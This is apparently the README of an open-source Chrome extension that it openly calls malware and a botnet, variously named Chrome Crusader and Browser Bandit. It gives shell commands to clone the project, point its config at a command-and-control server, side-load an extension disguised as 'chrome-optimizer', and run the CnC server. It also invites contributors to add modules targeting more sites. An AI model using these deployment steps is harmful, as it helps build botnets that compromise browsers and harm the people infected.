# Chrome Crusader

Chrome Crusader is a Google Chrome browser extension malware / botnet.

**NOTE: THIS IS MALWARE USE AT YOUR OWN RISK!**

# Installing Chrome Extension

```bash
git clone https://github.com/lillypad/browser-bandit.git
cd browser-bandit/
nano -w chrome-optimizer/config.js
chrome --load-extension=chrome-optimizer/
```

`config.js` should be setup with the CnC server's IP address and port.

# CnC Server Setup

```bash
cd cnc-server/
sudo python setup.py install
bbserver.py
```

# Features to Come
- SSL

# Contributing

Browser Bandit is created so it's very modular so other sites can be added easily if you add some code feel free to make a pull request.

# Disclaimer

By using this open-source software you indemnify and hold harmless it's creators and understand you are using this at your own risk.
